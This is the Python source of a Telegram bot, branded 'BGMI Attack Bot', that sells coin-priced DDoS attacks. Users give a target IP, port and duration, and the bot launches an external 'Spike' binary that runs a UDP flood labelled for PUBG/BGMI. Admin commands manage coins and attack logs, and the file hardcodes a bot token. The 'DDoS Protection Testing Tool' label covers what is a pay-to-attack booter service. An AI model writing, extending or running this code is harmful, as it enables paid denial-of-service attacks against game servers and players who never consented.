import os
import re
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import threading
import asyncio
from datetime import datetime, timedelta, timezone
import time
import requests
from requests.exceptions import ReadTimeout

# Initialize logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)

# Configuration
TOKEN = '7788865701:AAEW3E0_GZWjcwc4oyLKgFSuiV0d849mvXM'
CHANNEL_ID = '-1002298552334'
OFFICIAL_CHANNEL = "@titanfreeop"
CHANNEL_LINK = "https://t.me/titanfreeop"
ADMIN_IDS = [7163028849, 7184121244]

# File paths
USERS_FILE = "users.txt"
LOGS_FILE = "logs.txt"

# Initialize bot
bot = telebot.TeleBot(TOKEN)
session = requests.Session()
session.timeout = 60
bot.session = session

# Global variables
attack_in_progress = False
COOLDOWN_DURATION = 120
MAX_ATTACK_DURATION = 120
ATTACK_COST = 5
user_cooldowns = {}

# Ensure files exist
for file in [USERS_FILE, LOGS_FILE]:
    if not os.path.exists(file):
        open(file, 'w').close()

def log_action(action, user_id=None, details=""):
    """Log actions to logs file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_info = f"User {user_id}" if user_id else "System"
    log_entry = f"{timestamp} | {user_info} | {action} | {details}\n"
    
    with open(LOGS_FILE, 'a') as f:
        f.write(log_entry)

def get_user_info(user_id):
    """Get user info from Telegram"""
    try:
        user = bot.get_chat(user_id)
        return {
            'username': f"@{user.username}" if user.username else "None",
            'first_name': user.first_name if user.first_name else "None",
            'last_name': user.last_name if user.last_name else "None"
        }
    except Exception as e:
        logging.error(f"Error getting user info: {e}")
        return {
            'username': "Unknown",
            'first_name': "Unknown",
            'last_name': "Unknown"
        }

def add_coins(user_id, coins):
    """Add coins to user balance"""
    users = {}
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            for line in f:
                try:
                    uid, balance, attacks = line.strip().split('|')
                    users[int(uid)] = {
                        'balance': int(balance),
                        'attacks': int(attacks)
                    }
                except:
                    continue
    
    if user_id not in users:
        users[user_id] = {'balance': 0, 'attacks': 0}
    
    users[user_id]['balance'] += coins
    
    with open(USERS_FILE, 'w') as f:
        for uid, data in users.items():
            f.write(f"{uid}|{data['balance']}|{data['attacks']}\n")
    
    log_action("ADD_COINS", user_id, f"Added {coins} coins")

def deduct_coins(user_id, amount):
    """Deduct coins from user balance"""
    users = {}
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            for line in f:
                try:
                    uid, balance, attacks = line.strip().split('|')
                    users[int(uid)] = {
                        'balance': int(balance),
                        'attacks': int(attacks)
                    }
                except:
                    continue
    
    if user_id not in users or users[user_id]['balance'] < amount:
        return False
    
    users[user_id]['balance'] -= amount
    users[user_id]['attacks'] += 1
    
    with open(USERS_FILE, 'w') as f:
        for uid, data in users.items():
            f.write(f"{uid}|{data['balance']}|{data['attacks']}\n")
    
    log_action("DEDUCT_COINS", user_id, f"Deducted {amount} coins")
    return True

def get_user_stats(user_id):
    """Get user stats"""
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            for line in f:
                try:
                    uid, balance, attacks = line.strip().split('|')
                    if int(uid) == user_id:
                        return {
                            'balance': int(balance),
                            'attacks': int(attacks)
                        }
                except:
                    continue
    return {'balance': 0, 'attacks': 0}

def is_member(user_id):
    """Check if user is member of official channel"""
    try:
        chat_member = bot.get_chat_member(OFFICIAL_CHANNEL, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logging.error(f"Error checking membership: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Send welcome message"""
    user = message.from_user
    user_info = get_user_info(user.id)
    
    welcome_msg = f"""
    🎮 *Welcome {user_info['first_name']} to BGMI Attack Bot* 🛡️
    
    ⚡ *Premium DDoS Protection Testing Tool* ⚡
    
    💎 *Features:*
    - Powerful attack methods
    - Simple to use
    - Real-time monitoring
    
    📌 *Quick Guide:*
    1️⃣ Use /bgmi IP PORT TIME
    2️⃣ Each attack costs {ATTACK_COST} coins
    3️⃣ Check coins with /plan
    
    🔐 *Requirements:*
    - Must join {OFFICIAL_CHANNEL}
    - Need sufficient coins
    
    💰 *Get Coins:* @Titanop24
    """
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK),
        InlineKeyboardButton("💰 Buy Coins", url="https://t.me/Titanop24")
    )
    markup.row(
        InlineKeyboardButton("⚡ Start Attack", callback_data='start_attack'),
        InlineKeyboardButton("📊 My Stats", callback_data='my_stats')
    )
    
    bot.send_message(
        message.chat.id,
        welcome_msg,
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    log_action("START", user.id)

@bot.message_handler(commands=['plan'])
def show_plan(message):
    """Show user's plan and coins"""
    user = message.from_user
    stats = get_user_stats(user.id)
    user_info = get_user_info(user.id)
    
    plan_msg = f"""
    📊 *User Stats for {user_info['first_name']}*

    🆔 User ID: `{user.id}`
    👤 Username: {user_info['username']}
    
    💰 *Coins Balance:* {stats['balance']}
    ⚔️ Total Attacks: {stats['attacks']}
    
    💸 *Attack Cost:* {ATTACK_COST} coins per attack
    ⏳ Cooldown: {COOLDOWN_DURATION} seconds
    
    🔋 *Status:* {'✅ Active' if stats['balance'] >= ATTACK_COST else '❌ Insufficient coins'}
    
    💳 To purchase coins, contact @Titanop24
    """
    
    bot.reply_to(
        message,
        plan_msg,
        parse_mode='Markdown'
    )
    
    log_action("CHECK_PLAN", user.id)

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    """Handle attack command"""
    global attack_in_progress
    user = message.from_user
    
    # Check channel membership
    if not is_member(user.id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🌟 Join Channel", url=CHANNEL_LINK))
        
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\nYou must join our channel to use this bot!",
            parse_mode='Markdown',
            reply_markup=markup
        )
        return
    
    # Check if in correct channel
    if str(message.chat.id) != CHANNEL_ID:
        bot.reply_to(message, "❌ This command only works in the official channel!")
        return
    
    # Check cooldown
    if user.id in user_cooldowns and datetime.now() < user_cooldowns[user.id]:
        remaining = (user_cooldowns[user.id] - datetime.now()).seconds
        bot.reply_to(
            message,
            f"⏳ *Cooldown Active*\n\nPlease wait {remaining} seconds before next attack!",
            parse_mode='Markdown'
        )
        return
    
    # Check attack in progress
    if attack_in_progress:
        bot.reply_to(
            message,
            "⚡ *Attack in Progress*\n\nAnother attack is currently running. Please wait!",
            parse_mode='Markdown'
        )
        return
    
    # Parse command
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("⚠️ Usage: /bgmi IP PORT TIME")
        
        ip, port, duration = args
        
        # Validate IP
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            raise ValueError("Invalid IP address format")
        
        # Validate port
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            raise ValueError("Port must be between 1-65535")
        
        # Validate duration
        if not duration.isdigit() or not 1 <= int(duration) <= MAX_ATTACK_DURATION:
            raise ValueError(f"Duration must be 1-{MAX_ATTACK_DURATION} seconds")
        
        duration = int(duration)
        
        # Check coins
        if not deduct_coins(user.id, ATTACK_COST):
            raise ValueError(f"Insufficient coins. You need {ATTACK_COST} coins per attack")
        
        # Start attack
        attack_in_progress = True
        user_cooldowns[user.id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
        
        # Get user info
        user_info = get_user_info(user.id)
        attacker_name = user_info['username'] if user_info['username'] != "None" else user_info['first_name']
        
        # Send confirmation
        confirm_msg = f"""
        🚀 *Attack Launched Successfully!*
        
        🎯 Target: `{ip}:{port}`
        ⏳ Duration: {duration} seconds
        👤 Attacker: {attacker_name}
        
        💰 Coins Used: {ATTACK_COST}
        ⏱️ Cooldown: {COOLDOWN_DURATION}s
        
        🛡️ Attack will complete automatically!
        """
        
        bot.reply_to(
            message,
            confirm_msg,
            parse_mode='Markdown'
        )
        
        # Execute attack
        asyncio.run(execute_attack(ip, port, duration, user.id))
        
    except Exception as e:
        bot.reply_to(
            message,
            f"❌ *Error*\n\n{str(e)}",
            parse_mode='Markdown'
        )
        logging.error(f"Attack error: {e}")
    finally:
        attack_in_progress = False

async def execute_attack(ip, port, duration, user_id):
    """Execute attack using Spike binary with proper error handling and messaging"""
    try:
        # Get absolute path to binary
        script_dir = os.path.dirname(os.path.abspath(__file__))
        binary_path = os.path.join(script_dir, "Spike")
        
        # Validate binary
        if not os.path.exists(binary_path):
            raise FileNotFoundError("Attack binary 'Spike' not found")
        if not os.access(binary_path, os.X_OK):
            raise PermissionError("Attack binary not executable (run: chmod +x Spike)")

        # Prepare command
        cmd = f"{binary_path} {ip} {port} {duration} 12 750"
        log_action("ATTACK_START", user_id, f"{ip}:{port} for {duration}s")

        # Execute attack
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 30)
            if proc.returncode != 0:
                error_msg = stderr.decode().strip()[:300] if stderr else "Unknown error"
                raise RuntimeError(f"Attack failed with code {proc.returncode}: {error_msg}")
        except asyncio.TimeoutError:
            proc.terminate()
            await proc.wait()
            raise TimeoutError(f"Attack timed out after {duration + 30}s")

        # Send success message (non-await version)
        success_msg = f"""
✅ *Attack Successful* ✅

• Target: `{escape_markdown(ip)}:{escape_markdown(port)}`
• Duration: {escape_markdown(duration)}s
• Attacker: `{escape_markdown(user_id)}`
• Method: UDP Flood (PUBG/BGMI)
"""
        bot.send_message(CHANNEL_ID, success_msg, parse_mode='MarkdownV2')
        log_action("ATTACK_SUCCESS", user_id, f"{ip}:{port} {duration}s")

    except Exception as e:
        error_msg = f"""
❌ *Attack Failed* ❌

• Target: `{escape_markdown(ip)}:{escape_markdown(port)}`
• Error: {escape_markdown(str(e))}
"""
        bot.send_message(CHANNEL_ID, error_msg, parse_mode='MarkdownV2')
        log_action("ATTACK_FAILED", user_id, f"{ip}:{port} - {str(e)}")
        raise

def escape_markdown(text):
    """Escape special MarkdownV2 characters"""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))

@bot.message_handler(commands=['add_coin'])
def add_coin_command(message):
    """Add coins to user"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only admins can use this command!")
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 2:
            raise ValueError("Usage: /add_coin USER_ID COINS")
        
        user_id = int(args[0])
        coins = int(args[1])
        
        add_coins(user_id, coins)
        
        user_info = get_user_info(user_id)
        username = user_info['username'] if user_info['username'] != "None" else user_info['first_name']
        
        bot.reply_to(
            message,
            f"""
            ✅ *Coins Added Successfully!*
            
            👤 User: {username} (ID: {user_id})
            💰 Coins Added: {coins}
            
            💳 New Balance: {get_user_stats(user_id)['balance']} coins
            """,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.reply_to(
            message,
            f"❌ Error: {str(e)}",
            parse_mode='Markdown'
        )

@bot.message_handler(commands=['users'])
def list_users(message):
    """List all users with perfect column formatting"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only admins can use this command!")
        return
    
    try:
        if not os.path.exists(USERS_FILE) or os.path.getsize(USERS_FILE) == 0:
            bot.reply_to(message, "📭 No users found in database!")
            return
        
        with open(USERS_FILE, 'r') as f:
            users_data = f.readlines()
        
        # Prepare data
        users = []
        total_coins_added = 0
        total_coins_available = 0
        total_attacks = 0
        
        for line in users_data:
            try:
                uid, coins, attacks = line.strip().split('|')
                user_info = get_user_info(int(uid))
                
                # Calculate total coins added (available + spent)
                coins_added = int(coins) + (int(attacks) * ATTACK_COST)
                
                users.append({
                    'id': int(uid),
                    'name': user_info['first_name'] + (' ' + user_info['last_name'] if user_info['last_name'] != "None" else ""),
                    'username': user_info['username'],
                    'coins': int(coins),
                    'attacks': int(attacks),
                    'coins_added': coins_added
                })
                
                total_coins_added += coins_added
                total_coins_available += int(coins)
                total_attacks += int(attacks)
            except Exception as e:
                logging.error(f"Error parsing user line: {line.strip()} - {e}")
                continue
        
        if not users:
            bot.reply_to(message, "📭 No valid user data found!")
            return
        
        # Sort by coins added (descending)
        users.sort(key=lambda x: x['coins_added'], reverse=True)
        
        # Prepare header
        header = "🆔 ID        | 👤 Name            | 💰 Added | 💎 Available | ⚔️ Attacks\n"
        separator = "───────────┼───────────────────┼──────────┼──────────────┼──────────\n"
        
        # Format each user line
        user_lines = []
        for user in users:
            # Format name with username if available
            display_name = user['name']
            if user['username'] != "None":
                display_name += f" ({user['username']})"
            
            # Add crown emoji for admin
            if user['id'] in ADMIN_IDS:
                display_name += " 👑"
            
            # Format the line with fixed-width columns
            line = (
                f"{user['id']:<11}| "
                f"{display_name[:17]:<17}| "
                f"{user['coins_added']:<8}| "
                f"{user['coins']:<12}| "
                f"{user['attacks']}"
            )
            user_lines.append(line)
        
        # Build final message
        response = "📊 *User Statistics Report*\n\n"
        response += header
        response += separator
        response += "\n".join(user_lines[:50])  # Show first 50 users
        
        # Add summary
        response += f"\n\n📈 *Totals:*\n"
        response += f"• 👥 Users: {len(users)}\n"
        response += f"• 💰 Total coins added: {total_coins_added}\n"
        response += f"• 💎 Total coins available: {total_coins_available}\n"
        response += f"• ⚔️ Total attacks: {total_attacks}\n"
        response += f"• 💸 Total coins spent: {total_attacks * ATTACK_COST}"
        
        # Send message (split if too long)
        if len(response) > 4000:
            parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for part in parts:
                bot.reply_to(message, part, parse_mode='Markdown')
        else:
            bot.reply_to(message, response, parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(
            message,
            f"❌ Error generating user report: {str(e)}",
            parse_mode='Markdown'
        )
        logging.error(f"Users command error: {e}")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    """Show logs with proper formatting"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only command!")
        return
    
    try:
        if not os.path.exists(LOGS_FILE):
            bot.reply_to(message, "📭 No logs found!")
            return

        with open(LOGS_FILE, 'r', encoding='utf-8') as f:
            logs = f.readlines()[-50:]  # Get last 50 entries

        if not logs:
            bot.reply_to(message, "📭 No logs available!")
            return

        # Format logs with proper escaping
        formatted_logs = []
        for log in logs:
            try:
                timestamp, user, action, details = log.strip().split(' | ', 3)
                formatted_logs.append(
                    f"{timestamp} | {user} | {action} | {details}"
                )
            except ValueError:
                formatted_logs.append(log.strip())

        # Send as plain text to avoid Markdown issues
        response = "📜 Recent Logs (last 50 entries)\n\n"
        response += "```\n"
        response += "\n".join(formatted_logs)
        response += "\n```"
        
        bot.reply_to(message, response, parse_mode='MarkdownV2')

    except Exception as e:
        bot.reply_to(message, f"❌ Error showing logs: {str(e)}", parse_mode=None)

@bot.message_handler(commands=['clear_logs'])
def clear_logs(message):
    """Clear logs"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only admins can use this command!")
        return
    
    try:
        if not os.path.exists(LOGS_FILE) or os.path.getsize(LOGS_FILE) == 0:
            bot.reply_to(message, "📭 No logs to clear!")
            return
        
        with open(LOGS_FILE, 'r') as f:
            log_count = len(f.readlines())
        
        open(LOGS_FILE, 'w').close()
        
        bot.reply_to(
            message,
            f"🧹 *Logs Cleared!*\n\nDeleted {log_count} log entries.",
            parse_mode='Markdown'
        )
        
        log_action("CLEAR_LOGS", message.from_user.id, f"Cleared {log_count} logs")
        
    except Exception as e:
        bot.reply_to(
            message,
            f"❌ Error: {str(e)}",
            parse_mode='Markdown'
        )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    """Handle button callbacks"""
    try:
        if call.data == 'start_attack':
            bot.answer_callback_query(call.id, "Use /bgmi IP PORT TIME to attack!")
        elif call.data == 'my_stats':
            bot.answer_callback_query(call.id)
            show_plan(call.message)
    except Exception as e:
        logging.error(f"Callback error: {e}")

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
